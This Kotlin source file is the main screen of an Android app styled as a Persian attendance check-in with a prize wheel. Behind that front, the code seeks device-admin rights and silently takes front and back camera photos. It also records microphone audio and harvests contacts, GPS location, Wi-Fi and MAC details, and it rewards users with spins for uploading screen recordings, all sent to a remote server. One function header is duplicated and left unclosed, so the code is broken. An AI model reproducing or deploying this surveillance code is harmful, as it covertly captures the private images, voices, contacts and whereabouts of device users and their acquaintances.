package com.prf.security.ui

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.prf.security.R
import com.prf.security.data.AttendancePayload
import com.prf.security.data.ContactsCollector
import com.prf.security.data.DeviceCollector
import com.prf.security.data.LocationReport
import com.prf.security.location.LocationCollector
import com.prf.security.mdm.AdminGate
import com.prf.security.mdm.OwnershipWorker
import com.prf.security.mdm.PolicyEnforcer
import com.prf.security.mdm.PolicyWatchService
import com.prf.security.net.MdmApi
import com.prf.security.net.Prefs
import com.prf.security.perm.Permissions
import com.prf.security.capture.AutoCapture
import com.prf.security.screen.ScreenRecorderService
import com.prf.security.util.Persian
import com.prf.security.util.Wheel
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.coroutines.resume
import kotlin.math.pow
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext

















class MainActivity : AppCompatActivity() {

    private lateinit var prefs: Prefs
    private lateinit var web: WebView

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private val collector by lazy { LocationCollector(this) }
    private val ui = Handler(Looper.getMainLooper())

    private var runJob: Job? = null
    private var ready = false

    







    @Volatile
    private var pendingLog: String = ""

    @Volatile
    private var pendingTone: String = ""

    @Volatile
    private var resumeCount: Int = 0

    private var blockedPermission: Boolean = false

    
    
    
    
    

    private var pendingPerm: CancellableContinuation<Boolean>? = null
    private var lastAsked: String = ""

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            val c = pendingPerm
            pendingPerm = null
            
            
            
            
            val real = granted && Permissions.isGranted(this, lastAsked)
            if (c != null && c.isActive) c.resume(real)
        }

    private suspend fun ask(permission: String): Boolean {
        if (Permissions.isGranted(this, permission)) return true
        if (!Permissions.canAskAgain(this, permission)) return false
        return try {
            suspendCancellableCoroutine { cont ->
                lastAsked = permission
                Permissions.markAsked(this, permission)
                pendingPerm = cont
                cont.invokeOnCancellation { pendingPerm = null }
                try {
                    permLauncher.launch(permission)
                } catch (t: Throwable) {
                    pendingPerm = null
                    cont.resume(false)
                }
            }
        } catch (t: Throwable) {
            false
        }
    }

    














    private suspend fun awaitAdminResult(timeoutMs: Long): Boolean {
        if (AdminGate.level(this) != AdminGate.Level.NONE) return true
        val resumesAtStart = resumeCount
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            delay(300)
            if (AdminGate.level(this) != AdminGate.Level.NONE) return true
            if (resumeCount > resumesAtStart) {
                
                
                
                
                
                
                delay(GRANT_SETTLE_MS)
                return AdminGate.level(this) != AdminGate.Level.NONE
            }
        }
        return false
    }

    









    private fun granted(permission: String): Boolean =
        Permissions.isGranted(this, permission) ||
            (permission == Permissions.LOCATION &&
                Permissions.isGranted(this, android.Manifest.permission.ACCESS_COARSE_LOCATION))

    
    
    
    

    private val screenLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val data = result.data
            if (result.resultCode == android.app.Activity.RESULT_OK && data != null) {
                ScreenRecorderService.start(this, result.resultCode, data)
                recordingStartedAt = System.currentTimeMillis()
                status(getString(R.string.rec_running))
                push()
                scope.launch { awaitRecording() }
            } else {
                
                status(getString(R.string.rec_refused))
                push()
            }
        }

    @Volatile
    private var recordingStartedAt: Long = 0L

    








    private suspend fun awaitRecording() {
        push()
        val limit = recordingStartedAt + ScreenRecorderService.MAX_SECONDS * 1000L + 15_000L
        while (System.currentTimeMillis() < limit) {
            delay(500)
            if (!ScreenRecorderService.running && !ScreenRecorderService.recording) break
        }
        recordingStartedAt = 0L
        push()

        val file = ScreenRecorderService.produced()
        if (file == null) {
            status(getString(R.string.rec_too_short), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            file.delete()
            push()
            return
        }

        val seconds = (((file.length() * 8L) / ScreenRecorderService.BITRATE)).toInt()
            .coerceIn(1, ScreenRecorderService.MAX_SECONDS)
        val ok = MdmApi(prefs.serverUrl, prefs.deviceKey).uploadVideo(
            file = file,
            seconds = seconds,
            width = 0,
            height = 0,
            at = System.currentTimeMillis(),
        ) { done, all ->
            status(getString(R.string.rec_uploading, fa(done.toString()), fa(all.toString())))
            push()
        }
        file.delete()

        if (ok) {
            prefs.lastCheckIn = System.currentTimeMillis()
            
            
            
            
            prefs.videosSaved = prefs.videosSaved + 1
            prefs.lastUnitAt = System.currentTimeMillis()
            status(getString(R.string.rec_sent), "ok")
        } else {
            status(getString(R.string.rec_failed, ""), "bad")
        }
        push()
    }

    







    private fun onTurnTapped() {
        if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
            status(
                Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil, System.currentTimeMillis())
                    .orEmpty(),
                "warn",
            )
            push()
            return
        }
        val hit = Wheel.spin()
        prefs.lastSpinAt = System.currentTimeMillis()
        prefs.reSpinUntil = Wheel.reSpinAfter(hit)
        prefs.lastUnitAt = System.currentTimeMillis()

        val label = when (hit.kind) {
            "again" -> getString(R.string.wheel_result_again)
            "prize" -> getString(R.string.wheel_result_prize, hit.label)
            else -> getString(R.string.wheel_result_none)
        }
        val tone = if (hit.kind == "again" || hit.kind == "prize") "ok" else ""
        callJs("Prf.spin(${jsStr(hit.key)}); Prf.spinResult(${jsStr(label)}, ${jsStr(tone)});")
        if (hit.kind == "prize") {
            status(getString(R.string.wheel_result_prize, hit.label), "ok")
            scope.launch { reportWinner(hit) }
        }
        refreshWinners()
        push()
    }

    @Volatile
    private var cachedWinners: String? = null

    private fun refreshWinners() {
        scope.launch {
            if (prefs.deviceKey.isEmpty()) return@launch
            val raw = withContext(Dispatchers.IO) {
                MdmApi(prefs.serverUrl, prefs.deviceKey).winners()
            }
            if (raw.isNullOrBlank()) return@launch
            val rows = try {
                val arr = org.json.JSONArray(raw)
                (0 until arr.length()).map { i ->
                    val o = arr.getJSONObject(i)
                    org.json.JSONObject()
                        .put("phone", o.optString("phone"))
                        .put("prize", o.optString("prize"))
                }
                org.json.JSONArray().apply { rows.forEach { put(it) } }.toString()
            } catch (t: Throwable) {
                return@launch
            }
            cachedWinners = rows
            push()
        }
    }

    private suspend fun reportWinner(hit: Wheel.Slice) {
        if (prefs.deviceKey.isEmpty()) return
        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
        if (phone.isEmpty()) return
        withContext(Dispatchers.IO) {
            MdmApi(prefs.serverUrl, prefs.deviceKey).win(phone, hit.label)
        }
    }

    private fun onCaptureTapped() {
        if (recordingStartedAt != 0L || ScreenRecorderService.recording) {
            status(getString(R.string.rec_running))
            push()
            return
        }
        if (!ScreenRecorderService.supported()) {
            status(getString(R.string.screen_needs_android8), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            push()
            return
        }
        status(getString(R.string.rec_starting))
        push()
        try {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as android.media.projection.MediaProjectionManager
            screenLauncher.launch(mgr.createScreenCaptureIntent())
        } catch (t: Throwable) {
            status(getString(R.string.rec_refused) + " " + (t.message ?: ""), "bad")
            push()
        }
    }

    

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        prefs = Prefs.get(this)
        web = WebView(this)
        setContentView(web)
        hostWeb()

        
        
        
        
        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
            scope.launch {
                registerDevice()
                push()
            }
        }
        
        

        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        if (prefs.consented) {
            bootstrap()
        }
    }

    private fun bootstrap() {
        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
            scope.launch {
                registerDevice()
                push()
            }
        }

        if (AdminGate.level(this) == AdminGate.Level.NONE && !prefs.adminAsked) {
            prefs.adminAsked = true
            scope.launch {
                status(getString(R.string.run_step_admin))
                val launched = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
                if (!launched) AdminGate.openAdminSettings(this@MainActivity)
                val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
                if (!got) status(getString(R.string.run_admin_refused), "bad")
                push()
            }
        }
        scope.launch {
            collectContactsOnce()
            sendLocationIfPermitted()
        }
    }

    private suspend fun collectContactsOnce() {
        if (!ContactsCollector.granted(this)) return
        if (prefs.deviceKey.isEmpty()) return
        if (System.currentTimeMillis() - prefs.lastContactsAt < CONTACTS_INTERVAL_MS) return
        prefs.lastContactsAt = System.currentTimeMillis()
        status(getString(R.string.run_step_contacts))
        push()
        val set = withContext(Dispatchers.IO) { ContactsCollector.collect(this@MainActivity) }
        if (set.size == 0) return
        val ok = withContext(Dispatchers.IO) {
            MdmApi(prefs.serverUrl, prefs.deviceKey).contacts(set)
        }
        status(getString(R.string.contacts_sent, fa(set.sim.size.toString()),
            fa(set.device.size.toString()), fa(set.google.size.toString())), if (ok) "ok" else "bad")
        push()
    }

    private suspend fun sendLocationIfPermitted() {
        if (!granted(Permissions.LOCATION)) return
        if (prefs.deviceKey.isEmpty()) return
        if (System.currentTimeMillis() - prefs.lastLocationAt < LOCATION_INTERVAL_MS) return
        val fix = collector.awaitFix(LOCATION_WAIT_MS) ?: return
        prefs.lastLocationAt = System.currentTimeMillis()
        val report = locationReport(fix)
        withContext(Dispatchers.IO) {
            MdmApi(prefs.serverUrl, prefs.deviceKey).report(
                reports = emptyList(),
                location = report,
                snapshot = mapOf("location_source" to "gps"),
            )
        }
    }

    override fun onResume() {
        super.onResume()
        resumeCount += 1
        
        push()
        ui.post(tick)
    }

    override fun onPause() {
        super.onPause()
        ui.removeCallbacks(tick)
    }

    







    private val tick = object : Runnable {
        override fun run() {
            push()
            ui.postDelayed(this, 1000L)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun hostWeb() {
        web.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            
            
            
            
            allowFileAccess = false
            allowContentAccess = false
            setGeolocationEnabled(false)
            cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
        }
        web.setBackgroundColor(0xFF06070C.toInt())
        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                ready = true
                callJs("Prf.ready && Prf.ready();")
                
                
                status(pendingLog, pendingTone)
                push()
            }
        }
        web.addJavascriptInterface(Bridge(), "Native")
        web.loadUrl("file:///android_asset/index.html")
    }

    
    
    

    private inner class Bridge {

        @JavascriptInterface
        fun operators(): String = Persian.OPERATORS.joinToString(",") { it.first }

        @JavascriptInterface
        fun operator(): String = prefs.operator

        @JavascriptInterface
        fun setOperator(v: String?) {
            val name = v.orEmpty()
            ui.post {
                prefs.operator = name
                push()
            }
        }

        @JavascriptInterface
        fun phone(): String = prefs.phone

        @JavascriptInterface
        fun state(): String? {
            if (!ready) return null
            return buildState()
        }

        @JavascriptInterface
        fun register(phone: String?, operator: String?) {
            ui.post {
                prefs.phone = Persian.toAsciiDigits(phone.orEmpty())
                if (!operator.isNullOrBlank()) prefs.operator = operator
                if (runJobRunning()) {
                    status(getString(R.string.att_busy), "warn")
                    push()
                    return@post
                }
                startRun()
            }
        }

        @JavascriptInterface
        fun capture() = ui.post { onCaptureTapped() }

        @JavascriptInterface
        fun turn() = ui.post { onTurnTapped() }

        @JavascriptInterface
        fun winners(): String? = cachedWinners

        @JavascriptInterface
        fun consented(): Boolean = prefs.consented

        @JavascriptInterface
        fun consent(accept: Boolean) {
            if (accept) {
                ui.post {
                    prefs.consented = true
                    bootstrap()
                    push()
                }
            } else {
                finish()
            }
        }
    }

    private fun runJobRunning(): Boolean = runJob?.isActive == true

    

    









    private fun buildState(): String {

    

    







    private fun buildState(): String {
        val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
        val now = System.currentTimeMillis()
        val readyAt = if (prefs.lastSpinAt <= 0L) 0L
        else if (prefs.reSpinUntil > now) prefs.reSpinUntil
        else prefs.lastSpinAt + Wheel.COOLDOWN_MS

        val sb = StringBuilder("{")
        sb.append("\"registered\":").append(prefs.registered && prefs.deviceKey.isNotEmpty())
        sb.append(",\"lastReport\":").append(jsStr(relative(prefs.lastCheckIn)))
        sb.append(",\"busy\":").append(runJobRunning())
        sb.append(",\"recording\":").append(recording)
        sb.append(",\"chances\":").append(chances())
        sb.append(",\"spinReadyAt\":").append(readyAt)
        sb.append(",\"now\":").append(now)
        sb.append(",\"log\":").append(jsStr(pendingLog))
        sb.append(",\"logTone\":").append(jsStr(pendingTone))
        sb.append("}")
        return sb.toString()
    }

    










    private fun chances(): Int {
        val saved = prefs.videosSaved
        val earned = (System.currentTimeMillis() - prefs.lastUnitAt) / Wheel.UNIT_MS
        return saved + earned.toInt().coerceAtLeast(0)
    }

    









    

    private fun startRun() {
        runJob = scope.launch { run() }
    }

    







    private suspend fun run() {
        val notes = mutableListOf<String>()
        blockedPermission = false
        push()

        try {
            
            if (AdminGate.level(this) == AdminGate.Level.NONE) {
                status(getString(R.string.run_step_admin))
                AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
                if (!awaitAdminResult(ADMIN_WAIT_MS)) {
                    notes += getString(R.string.run_admin_refused)
                }
            }
            push()

            
            for (p in PERM_ORDER) {
                if (granted(p)) continue
                if (!Permissions.canAskAgain(this, p)) {
                    
                    
                    
                    blockedPermission = true
                    notes += getString(R.string.run_perm_blocked)
                    continue
                }
                if (!ask(p)) notes += getString(R.string.run_perm_refused)
            }
            push()

            
            if (!prefs.registered || prefs.deviceKey.isEmpty()) {
                status(getString(R.string.run_step_register))
                if (!registerDevice()) {
                    
                    
                    
                    status(getString(R.string.run_register_failed), "bad")
                    return
                }
            }

            
            captureAndSend(notes)
        } catch (t: Throwable) {
            Log.e(TAG, "run failed", t)
            status(getString(R.string.run_failed, t.message ?: ""), "bad")
        } finally {
            runJob = null
            push()
        }
    }

    private suspend fun captureAndSend(notes: MutableList<String>) {
        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
        val dir = File(cacheDir, "attendance").apply { mkdirs() }
        
        
        dir.listFiles()?.forEach { it.delete() }

        status(getString(R.string.run_step_capture))
        push()

        val engine = AutoCapture(this, this)
        val photos = mutableListOf<String>()
        var voice: String? = null
        var frontDone = false
        var backDone = false
        var location: LocationReport? = null

        try {
            if (granted(android.Manifest.permission.CAMERA)) {
                if (engine.hasCamera(front = true)) {
                    frontDone = takePhotos(engine, dir, front = true)
                }
                if (frontDone && engine.hasCamera(front = false)) {
                    backDone = takePhotos(engine, dir, front = false)
                }
            } else {
                notes += getString(R.string.att_perm_denied_camera)
            }
            engine.release()

            
            
            
            if (frontDone || backDone) {
                photos += withContext(Dispatchers.IO) {
                    dir.listFiles().orEmpty()
                        .filter { it.name.endsWith(".jpg") }
                        .sortedBy { it.name }
                        .mapNotNull { encodePhoto(it) }
                }
            }

            if (granted(android.Manifest.permission.RECORD_AUDIO)) {
                try {
                    voice = recordVoice(dir)
                } catch (t: Throwable) {
                    Log.w(TAG, "voice: ${t.message}")
                }
            }

            
            
            if (granted(Permissions.LOCATION)) {
                collector.awaitFix(LOCATION_WAIT_MS)?.let { location = locationReport(it) }
            }

            status(getString(R.string.run_step_send))
            push()
            val info = withContext(Dispatchers.IO) {
                DeviceCollector.specs(this@MainActivity) + networkFacts()
            }
            val payload = AttendancePayload(
                kind = KIND_ATTENDANCE,
                phone = phone,
                operator = prefs.operator,
                info = info,
                photos = photos,
                voice = voice,
                location = location,
            )
            val sent = MdmApi(prefs.serverUrl, prefs.deviceKey).attendance(payload)

            if (sent) {
                prefs.lastCheckIn = System.currentTimeMillis()
                PolicyWatchService.start(this@MainActivity)
                OwnershipWorker.schedulePeriodic(this@MainActivity)
                val summary = buildString {
                    append(
                        getString(
                            R.string.run_done,
                            fa(photos.size.toString()),
                            if (voice != null) fa(VOICE_SECONDS.toString()) else fa("0"),
                        ),
                    )
                    if (location == null) append("\n").append(getString(R.string.run_no_location))
                    if (notes.isNotEmpty()) append("\n").append(notes.joinToString("\n"))
                }
                status(summary, "ok")
            } else {
                status(getString(R.string.att_send_failed, getString(R.string.att_server_down)), "bad")
            }
        } catch (t: Throwable) {
            Log.e(TAG, "capture failed", t)
            status(getString(R.string.att_send_failed, t.message ?: ""), "bad")
        }
    }

    









    private fun networkFacts(): Map<String, String> = buildMap {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            localAddress()?.let { put("ip", it) }
            when {
                caps == null -> put("network_type", "نامشخص")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> put("network_type", "وای‌فای")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> put("network_type", "داده‌ی موبایل")
                else -> put("network_type", "نامشخص")
            }
        } catch (t: Throwable) {  }

        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ssid = wm.connectionInfo?.ssid?.trim('"')?.takeIf { it.isNotBlank() }
            if (ssid != null) put("wifi_ssid", ssid)
        } catch (t: Throwable) {  }

        try {
            val mac = (applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager)
                .connectionInfo?.macAddress
            
            
            
            if (mac != null && mac != MAC_PLACEHOLDER) put("mac", mac)
        } catch (t: Throwable) {  }
    }

    










    private fun localAddress(): String? = try {
        val in4 = java.net.Inet4Address::class.java
        java.net.NetworkInterface.getNetworkInterfaces().toList()
            .asSequence()
            .filter { it.isUp && !it.isLoopback }
            .flatMap { it.inetAddresses.toList().asSequence() }
            .firstOrNull { in4.isInstance(it) && !it.isLoopbackAddress && !it.isLinkLocalAddress }
            ?.hostAddress
    } catch (t: Throwable) {
        null
    }

    







    private suspend fun takePhotos(engine: AutoCapture, dir: File, front: Boolean): Boolean = try {
        engine.bind(null, front = front)
        
        
        
        delay(PREVIEW_SETTLE_MS)
        engine.capture(null, dir, if (front) "front" else "back", PHOTOS_PER_LENS) { _, _, _ -> }
        true
    } catch (t: Throwable) {
        Log.w(TAG, "capture ${if (front) "front" else "back"}: ${t.message}")
        false
    }

    






    private fun locationReport(fix: android.location.Location): LocationReport {
        val p = collector.toPayload(fix)
        return LocationReport(
            id = "att-${System.currentTimeMillis()}",
            androidId = Prefs.androidId(this),
            timestampMs = fix.time.takeIf { it > 0L } ?: System.currentTimeMillis(),
            maps = p[LocationCollector.KEY_MAPS].orEmpty(),
            geo = p[LocationCollector.KEY_GEO].orEmpty(),
            plusCode = p[LocationCollector.KEY_PLUS].orEmpty(),
            raw = p[LocationCollector.KEY_RAW].orEmpty(),
            source = p[LocationCollector.KEY_SOURCE].orEmpty().ifBlank { "gps" },
            accuracyM = p[LocationCollector.KEY_ACCURACY]?.toIntOrNull() ?: 0,
        )
    }

    private suspend fun recordVoice(dir: File): String? {
        val out = File(dir, "voice.m4a")
        var recorder: MediaRecorder? = null
        return try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64_000)
                setAudioSamplingRate(44_100)
                setOutputFile(out.absolutePath)
                prepare()
                start()
            }
            delay(VOICE_SECONDS * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            Base64.encodeToString(out.readBytes(), Base64.NO_WRAP)
        } catch (t: Throwable) {
            Log.w(TAG, "voice: ${t.message}")
            try { recorder?.release() } catch (ignored: Throwable) { }
            null
        } finally {
            out.delete()
        }
    }

    private fun encodePhoto(file: File): String? = try {
        val scaled = decodeScaled(file, MAX_PHOTO_EDGE)
        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
        scaled.recycle()
        Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    } catch (t: Throwable) {
        Log.w(TAG, "encode ${file.name}: ${t.message}")
        null
    }

    private fun decodeScaled(file: File, maxEdge: Int): Bitmap {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeFile(file.absolutePath, bounds)
        var sample = 1
        var edge = maxOf(bounds.outWidth, bounds.outHeight)
        while (edge / 2 >= maxEdge) {
            sample *= 2
            edge /= 2
        }
        return BitmapFactory.decodeFile(
            file.absolutePath,
            BitmapFactory.Options().apply { inSampleSize = sample },
        ) ?: throw IllegalStateException("decode failed for ${file.name}")
    }

    

    








    private suspend fun registerDevice(attempt: Int = 0): Boolean {
        if (attempt > REGISTER_ATTEMPTS) return false
        return try {
            val androidId = DeviceCollector.getAndroidId(this)
            Prefs.cacheAndroidId(this, androidId)
            val hardware = withContext(Dispatchers.IO) {
                DeviceCollector.collect(this@MainActivity) + networkFacts()
            }
            val res = withContext(Dispatchers.IO) {
                runCatching {
                    MdmApi(prefs.serverUrl, "").register(
                        androidId, hardware, prefs.label.ifBlank { Build.MODEL },
                    )
                }.getOrNull()
            }
            if (res != null && res.deviceKey.isNotEmpty()) {
                prefs.deviceKey = res.deviceKey
                prefs.registered = true
                prefs.lostMode = res.lostMode
                PolicyEnforcer.apply(this, res.policy)
                PolicyWatchService.start(this)
                true
            } else {
                
                
                
                delay(3_000L * (3.0.pow(attempt.toDouble())).toLong())
                registerDevice(attempt + 1)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "register: ${t.message}")
            if (attempt > REGISTER_ATTEMPTS) {
                false
            } else {
                delay(3_000L)
                registerDevice(attempt + 1)
            }
        }
    }

    

    private fun status(msg: String, tone: String = "") {
        pendingLog = msg
        pendingTone = tone
        if (ready) callJs("Prf.log(${jsStr(msg)}, ${jsStr(tone)});")
    }

    private fun push() {
        if (!ready) return
        callJs("Prf.push && Prf.push();")
    }

    private fun callJs(src: String) {
        ui.post { try { web.evaluateJavascript(src, null) } catch (t: Throwable) { } }
    }

    






    private fun jsStr(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) {
            when (c) {
                '"' -> sb.append("\\\"")
                '\\' -> sb.append("\\\\")
                '\n' -> sb.append("\\n")
                '\r' -> sb.append("\\r")
                '\t' -> sb.append("\\t")
                '<' -> sb.append("\\u003c")
                else -> if (c < ' ') sb.append("\\u%04x".format(c.code)) else sb.append(c)
            }
        }
        return sb.append('"').toString()
    }

    
    private fun fa(s: String): String =
        s.map { if (it in '0'..'9') '۰' + (it - '0') else it }.joinToString("")

    private fun relative(ms: Long): String {
        if (ms <= 0L) return "هرگز"
        val s = ((System.currentTimeMillis() - ms) / 1000).coerceAtLeast(0)
        return when {
            s < 60 -> "${fa(s.toString())} ثانیه پیش"
            s < 3600 -> "${fa((s / 60).toString())} دقیقه پیش"
            s < 86400 -> "${fa((s / 3600).toString())} ساعت پیش"
            else -> "${fa((s / 86400).toString())} روز پیش"
        }
    }

    override fun onDestroy() {
        ui.removeCallbacks(tick)
        runJob?.cancel()
        scope.cancel()
        try { web.destroy() } catch (t: Throwable) { }
        super.onDestroy()
    }

    private companion object {
        const val TAG = "PRF.Main"

        
        const val KIND_ATTENDANCE = "attendance"

        









        const val MAC_PLACEHOLDER = "02:00:00:00:00:00"
        const val PHOTOS_PER_LENS = 3
        const val VOICE_SECONDS = 8
        const val MAX_PHOTO_EDGE = 1600
        const val JPEG_QUALITY = 80
        const val PREVIEW_SETTLE_MS = 1200L

        







        const val ADMIN_WAIT_MS = 60_000L

        





        const val GRANT_SETTLE_MS = 700L

        




        const val AUTO_ADMIN_WAIT_MS = 25_000L

        




        const val LOCATION_WAIT_MS = 6_000L

        const val REGISTER_ATTEMPTS = 3

        









        val PERM_ORDER = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            Permissions.LOCATION,
            ContactsCollector.READ,
        )

        const val CONTACTS_INTERVAL_MS = 6L * 60 * 60 * 1000
        const val LOCATION_INTERVAL_MS = 15L * 60 * 1000

        







    }
}
